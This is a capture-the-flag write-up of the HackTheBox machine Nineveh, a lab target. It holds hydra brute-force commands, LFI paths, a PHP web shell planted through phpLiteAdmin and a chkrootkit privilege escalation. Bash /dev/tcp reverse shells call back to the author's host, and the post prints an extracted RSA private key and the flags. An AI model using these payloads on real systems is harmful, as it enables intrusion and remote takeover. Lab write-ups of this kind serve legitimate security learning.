---
layout: post
title: HackTheBox Nineveh
date: 2017-08-04
categories: [HackTheBox, Windows]
tags: [HackTheBox, Windows]
image: https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/image_previews/htb-nineveh.png?raw=true
---

# Machine Synopsis

Nineveh is not overly challenging, however several exploits must be chained to gain initial access. Several uncommon services are running on the machine, and some research is required to enumerate them. ([Source](https://www.hackthebox.com/machines/nineveh))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# nmap -sC -sV -A -p- 10.10.10.43
Nmap scan report for 10.10.10.43
Host is up (0.0035s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   2.98 ms 10.10.14.1
2   3.09 ms 10.10.10.43

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.47 seconds
```

Lets check out their website!

![website_port_80](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/website_port_80.png?raw=true)

Hmm.. it seems like their `http port 80` returns a default webpage.

How about their `https port 443`?

![website_port_443](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/website_port_443.png?raw=true)

Lets run `gobuster` on both the `http` and `https` website!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# gobuster dir -u http://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k 
...
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299]                           ...

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# gobuster dir -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k 
...
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/server-status        (Status: 403) [Size: 300]                              
/secure_notes         (Status: 301) [Size: 319] [--> https://10.10.10.43/secure_notes/]
...
```

Lets check out the `/department` webpage for their `http` site.

![department_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/department_webpage.png?raw=true)

It seems like a login page! Lets test out some default credentials.

Nothing worked but I noticed something interesting. When I used `admin` as the username, it returned `Invalid Password!`. However, when I used an arbitrary value as the username, it returned `Invalid username`.

This shows that `admin` is indeed a username in their database. So lets use `hydra` to help us out!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -s 80 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 
...
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
...
```

>   Refer to this [article](https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/) on how to use `hydra` to brute force websites & online forms.

Now, lets try logging into the department page to check if there’s anything interesting.

The only thing interesting on this webpage was the notes section.

![department_notes](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/department_notes.png?raw=true)

>   The notes showed that the credentials were actually hardcoded.
>
>   That probably meant that the backend was using the vulnerable `php strcmp` function. Technically speaking, we could have just used our browser to `Edit and Resend` function to send this parameter in the Request Body instead - `username=admin&password[]=`.
>
>   ![alternative_department_login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/alternative_department_login.png?raw=true)

Notice that the URL is `http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt`. The URL is using some file path as an argument, we could test for any LFI vulnerability.

```bash
URL: http://10.10.10.43/department/manage.php?notes=files/
Returned: No Note is selected.

URL: http://10.10.10.43/department/manage.php?notes=/etc/passwd
Returned: No Note is selected.

URL: http://10.10.10.43/department/manage.php?notes=files/ninevehNotes
Returned: Warning:  include(files/ninevehNotes): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31

URL: http://10.10.10.43/department/manage.php?notes=/ninevehNotes/
Returned: Warning:  include(/ninevehNotes/): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31

URL: http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../etc/passwd
Returned:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
amrois:x:1000:1000:,,,:/home/amrois:/bin/bash
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
```

Yay, the website if vulnerable to LFI. Now, we have to find a way to upload some malicious files on the server.

Lets look at our `gobuster` scan again for any clues. There is an interesting `/db` path for the `https` site so lets check it out.

![https_db](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/https_db.png?raw=true)

It seems to be powered by `phpLiteAdmin`. Lets run `searchsploit` for any existing exploits to bypass login!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# searchsploit phpliteadmin           
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                                | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                         | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                      | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                       | php/webapps/39714.txt
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

It turns out there wasn’t.. So lets use `hydra` to brute force the login again!

![db_attempt_login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/db_attempt_login.png?raw=true)

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# hydra -l shiro -P /usr/share/wordlists/rockyou.txt 10.10.10.43 -s 443 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password" -t 64
...
[443][http-post-form] host: 10.10.10.43   login: shiro   password: password123
1 of 1 target successfully completed, 1 valid password found
```

Yay! We found the password. Lets log in~

![phpliteadmin_login](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/phpliteadmin_login.png?raw=true)

# Exploit

Recall that the `searchsploit` had an interesting exploit called `Remote PHP Code Injection`. Lets check it out.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# searchsploit -x 24044   
...
Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php
...
```

So according to the proof of concept, we have to do the following:

1.  Create a new database
2.  Create a new table in the database with a default value `<?php echo system($_REQUEST ["cmd"]); ?>`
3.  View the database to execute the code

![upload_php_code](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/upload_php_code.png?raw=true)

![view_db](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/view_db.png?raw=true)

Now, we can exploit the LFI vulnerability to execute the malicious `php` code stored in the database by using `http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/shiro.php&cmd=whoami`!

![execute_php_code](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Nineveh/execute_php_code.png?raw=true)

Finally, we can start a netcat listener and then execute a reverse shell code!

```bash
URL: http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/shiro.php&cmd=bash -c 'exec bash -i %26>/dev/tcp/10.10.14.29/1234 <%261'

- Netcat Listener -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.43] 57400
bash: cannot set terminal process group (1387): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ whoami
www-data
```

# Privilege Escalation

## Intended Path

>   I was reading a writeup from this [article](https://ranakhalil101.medium.com/hack-the-box-nineveh-writeup-w-o-metasploit-1e84173ba485) and discovered that there was actually another path. 

After snooping around the directories on the server, we find this interesting folder called `secure_notes`.

```bash
www-data@nineveh:/var/www/html/department$ ls
css
files
footer.php
header.php
index.php
login.php
logout.php
manage.php
underconstruction.jpg

www-data@nineveh:/var/www/html/department$ cd ../
www-data@nineveh:/var/www/html$ ls
department
index.html
info.php
ninevehdestruction.jpg

www-data@nineveh:/var/www/html$ cd ../
www-data@nineveh:/var/www$ ls
html
ssl

www-data@nineveh:/var/www$ cd ssl
www-data@nineveh:/var/www/ssl$ ls
db
index.html
ninevehForAll.png
secure_notes

www-data@nineveh:/var/www/ssl$ cd secure_notes 
www-data@nineveh:/var/www/ssl/secure_notes$ ls
index.html
nineveh.png
www-data@nineveh:/var/www/ssl/secure_notes$ 
```

There seems to be an interesting `ninveh.png` file. Lets transfer the file over to our local machine and inspect it!

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ nc 10.10.14.29 9999 < nineveh.png
nc 10.10.14.29 9999 < nineveh.png

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# nc -nlvp 9999 > nineveh.png
listening on [any] 9999 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.43] 50188

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# binwalk nineveh.png      

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# binwalk -e nineveh.png --run-as=root

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1497 x 746, 8-bit/color RGB, non-interlaced
84            0x54            Zlib compressed data, best compression
2881744       0x2BF8D0        POSIX tar archive (GNU)

                                                                                                                      
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# ls
nineveh.png  _nineveh.png.extracted
                                   
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# cd _nineveh.png.extracted 
                                   
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh/_nineveh.png.extracted]
└─# ls
2BF8D0.tar  54  54.zlib  secret
                               
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh/_nineveh.png.extracted]
└─# cd secret                
                              
┌──(root㉿shiro)-[/home/…/HackTheBox/Nineveh/_nineveh.png.extracted/secret]
└─# ls
nineveh.priv  nineveh.pub

┌──(root㉿shiro)-[/home/…/HackTheBox/Nineveh/_nineveh.png.extracted/secret]
└─# cat nineveh.priv
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----                                                                                                             
┌──(root㉿shiro)-[/home/…/HackTheBox/Nineveh/_nineveh.png.extracted/secret]
└─# cat nineveh.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

There seems to be a RSA private key and public key hidden in the image! Notice that the username in the public key - `amrois`.

This seems to hint us that there is supposed to be way to ssh port open.

However, recall that our `nmap` scan did not show port 22 open. Could it be that the server has some firewall rules that blocks certain ports from being knocked?

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/init.d/knockd
cat /etc/init.d/knockd
...
Just checking if there's knockd
...

www-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/knockd.conf
cat /etc/knockd.conf
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn
```

Based on the `knockd` config file, we can open the `ssh` port by sending TCP packets to port `571`, `290` and `911` respectively.

```bash
┌──(root㉿shiro)-
[/home/…/HackTheBox/Nineveh/_nineveh.png.extracted/secret]
└─# for i in 571 290 911; do nmap -Pn --max-retries 0 -p $i 10.10.10.43 && sleep 1; done
...
PORT    STATE    SERVICE
571/tcp filtered umeter
...
PORT    STATE    SERVICE
290/tcp filtered unknown
...
PORT    STATE    SERVICE
911/tcp filtered xact-backup                                                                                                                    
┌──(root㉿shiro)-[/home/…/HackTheBox/Nineveh/_nineveh.png.extracted/secret]
└─# nmap 10.10.10.43
...
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 4.74 seconds
```

>   `-Pn`: skip host discovery
>
>   `-max-retries 0`: prevent any probe retransmissions

Now that the `ssh` port is open, we can try connecting with the RSA private key!

```bash
┌──(root㉿shiro)-[/home/…/HackTheBox/Nineveh/_nineveh.png.extracted/secret]
└─# ssh -i nineveh.priv amrois@10.10.10.43                                              
The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.
ED25519 key fingerprint is SHA256:kxSpgxC8gaU9OypTJXFLmc/2HKEmnDMIjzkkUiGLyuI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.43' (ED25519) to the list of known hosts.
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$ 
```

## Shortcut

Now that we gained access into the system, lets run a `LinEnum` script!

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# mousepad LinEnum.sh
                                                                            
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.43 - - [28/Jun/2022 22:47:21] "GET /LinEnum.sh HTTP/1.1" 200 -

- Netcat Listener -
www-data@nineveh:/var/www/html/department$ cd /tmp
cd /tmp
www-data@nineveh:/tmp$ wget http://10.10.14.29/LinEnum.sh
www-data@nineveh:/tmp$ chmod +x LinEnum.sh
www-data@nineveh:/tmp$ ./LinEnum.sh
./LinEnum.sh
...
```

Looking at the LinEnum results showed nothing of interest. So lets try monitoring the processes instead!

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# ls                       
LinEnum.sh  pspy32s
                                                                         
- Netcat Listener -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.43 - - [28/Jun/2022 22:52:43] "GET /pspy32s HTTP/1.1" 200 -

www-data@nineveh:/tmp$ wget http://10.10.14.29/pspy32s
www-data@nineveh:/tmp$ chmod +x pspy32s
www-data@nineveh:/tmp$ ./pspy32s
./pspy32s
...
2022/06/28 09:54:02 CMD: UID=0    PID=12776  | grep -E c 
2022/06/28 09:54:02 CMD: UID=0    PID=12775  | /bin/sh /usr/bin/chkrootkit 
2022/06/28 09:54:02 CMD: UID=0    PID=12774  | /bin/sh /usr/bin/chkrootkit 
...
```

Oh? There’s an interesting `/usr/bin/chkrootkit` process running as root!

Lets check if there’s any vulnerability associated with it.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# searchsploit chkrootkit             
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                        | linux/local/33899.txt
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                      
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# searchsploit -m 33899  
                                             
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# cat 33899.txt   
...
Steps to reproduce:

- Put an executable file named 'update' with non-root owner in /tmp (not
mounted noexec, obviously)
- Run chkrootkit (as uid 0)

Result: The file /tmp/update will be executed as root, thus effectively
rooting your box, if malicious content is placed inside the file.
...
```

OwO! So apparently we can gain privilege escalation by creating a file called `update` that contains malicious code! Lets try it~

```bash
- Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# mousepad update          
                                
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# cat update              
#!/bin/bash

bash -c 'exec bash -i &>/dev/tcp/10.10.14.29/9999 <&1'
                                                                                                                      
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# python3 -m http.server 80                                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.43 - - [28/Jun/2022 23:00:11] "GET /update HTTP/1.1" 200 -

- Netcat Listener -

www-data@nineveh:/tmp$ wget http://10.10.14.29/update
www-data@nineveh:/tmp$ chmod +x update

- Another Netcat Listener - 
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Nineveh]
└─# nc -nlvp 9999    
listening on [any] 9999 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.43] 50164
bash: cannot set terminal process group (21122): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# whoami
root
root@nineveh:~# cd /home
root@nineveh:/home# ls
amrois
root@nineveh:/home# cat /home/amrois/user.txt
5739ccb3a42b270d86e50c877513187c
root@nineveh:/home# cat /root/root.txt
be1e57843d1f3e03b88d890411bcd901
```
